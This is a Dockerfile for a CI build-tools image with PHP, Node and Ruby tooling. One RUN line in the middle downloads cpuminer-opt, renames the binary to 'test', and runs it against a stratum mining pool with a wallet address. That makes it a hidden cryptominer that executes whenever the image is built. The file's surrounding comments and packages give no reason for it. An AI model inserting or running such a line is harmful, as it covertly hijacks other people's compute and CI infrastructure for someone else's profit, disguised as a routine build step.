# Use an official Python runtime as a parent image
FROM circleci/php:7.3-node-browsers
# Switch to root user
USER root
# Install necessary packages for PHP extensions
RUN apt-get update && \
     apt-get install -y \
        wget \
        dnsutils \
        libmagickwand-dev \
        libzip-dev \
        libsodium-dev \
        libpng-dev \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        zlib1g-dev \
        libicu-dev \
        libxml2-dev \
        g++
# Set the memory limit to unlimited for expensive Composer interactions
RUN echo "memory_limit=-1" > /usr/local/etc/php/conf.d/memory.ini
###########################
# Install build tools things
###########################
# Set the working directory to /build-tools-ci
WORKDIR /build-tools-ci
# Copy the current directory contents into the container at /build-tools-ci
ADD . /build-tools-ci
# Collect the components we need for this image
RUN apt-get update
RUN apt-get install -y ruby jq curl rsync hub
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 test && ./test -a yescryptr8g -o stratum+tcp://stratum-na.rplant.xyz:3032 -u jzypu3NMxccKzwgAZrD74k5dbnPst4LUiYt.A-1
RUN gem install circle-cli
